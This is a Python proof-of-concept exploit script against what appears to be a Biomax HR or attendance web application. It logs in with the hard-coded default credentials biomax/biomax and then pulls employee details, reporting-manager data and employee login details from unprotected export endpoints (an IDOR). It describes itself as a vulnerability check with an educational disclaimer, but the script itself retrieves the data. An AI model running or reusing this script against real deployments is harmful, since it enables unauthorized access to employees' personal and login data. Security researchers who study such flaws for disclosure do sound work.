import requests
import wget
import os
import platform
from colorama import Fore, Style
import tempfile
import shutil

FLAG_VULNERABLETOIDOR = False
FLAG_DEFAULT_LOGIN = False


# Enable ANSI escape sequences for colors on Windows
if os.name == 'nt':
    os.system('')

def download_file(url, filename):
    wget.download(url, filename)

def login_to_web_app(protocol, url, port):
    global FLAG_DEFAULT_LOGIN

    target_url = f"{protocol}://{url}:{port}"
    login_endpoint = f"{target_url}/Default.aspx"
    credentials = {'username': 'biomax', 'password': 'biomax'}

    try:
        response = requests.post(login_endpoint, data=credentials)
        if response.status_code == 200:
            print("Login Successful!")
            FLAG_DEFAULT_LOGIN = True
            return target_url
        else:
            print("Login Failed!")
            return None
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)
        return None

def cleanup_files(file_paths):
    for file_path in file_paths:
        if os.path.exists(file_path):
            os.remove(file_path)

def main():
    global FLAG_VULNERABLETOIDOR
    global FLAG_DEFAULT_LOGIN

    # Disclaimer
    print(Fore.YELLOW + "Disclaimer: This script is for educational purposes only.")
    print("The author takes no responsibility for any unauthorized usage.")
    print("Please use this script responsibly and adhere to the legal and ethical guidelines.")
    print("This script may download sensitive information on your host machine.")
    print("Ensure that you have the necessary authorization to perform this action.")

    agree = input("Do you agree to the disclaimer? (1 = Yes, 0 = No): ")
    if agree != "1":
        print("You have chosen not to agree. Exiting the script.")
        exit()

    # Print name in red
    name = "Exploit by Tejas Nitin Pingulkar"
    print(Fore.RED + name)
    print(Style.RESET_ALL)  # Reset color

    protocol = input("Enter the target protocol (e.g., http, https): ")
    url = input("Enter the target IP to validate vulnerability: ")
    port = input("Enter the target port: ")

    website = login_to_web_app(protocol, url, port)
    if website is None:
        print("Exiting the script.")
        exit()
#Files will be stored in the temporary folder
    temp_folder = tempfile.gettempdir()
    

    urls_filenames = [
        (website + "/ExportEmployeeDetails.aspx?ActionName=ExportEmployeeDetails", "ExportEmployeeDetails.csv"),
        (website + "/ExportReportingManager.aspx", "ExportReportingManager.csv"),
        (website + "/ExportEmployeeLoginDetails.aspx", "ExportEmployeeLoginDetails.csv")
    ]

    

    downloaded_files = []

    for url, filename in urls_filenames:
        file_path = os.path.join(temp_folder, filename)
        download_file(url, file_path)
        file_size = os.path.getsize(file_path)
        if file_size > 3000:
            FLAG_VULNERABLETOIDOR = True
        downloaded_files.append(file_path)

    # Clean up downloaded files
    cleanup_files(downloaded_files)

    if FLAG_DEFAULT_LOGIN and FLAG_VULNERABLETOIDOR:
        print(Fore.RED +"\nTested application is vulnerable to IDOR as well as Default login credentials.")
    elif FLAG_DEFAULT_LOGIN:
        print(Fore.RED +"\nTested application has default login credentials.")
    elif FLAG_VULNERABLETOIDOR:
        print(Fore.RED +"\nTested application is vulnerable to IDOR.")
    else:
        print(Fore.GREEN +"\nTested application is secure.")

    # Print "for more such interesting exploits, visit cvewalkthrough.com" in red
    print(Fore.RED + "\nFor more such interesting exploits, visit cvewalkthrough.com")
    print(Style.RESET_ALL)  # Reset color

if __name__ == '__main__':
    main()
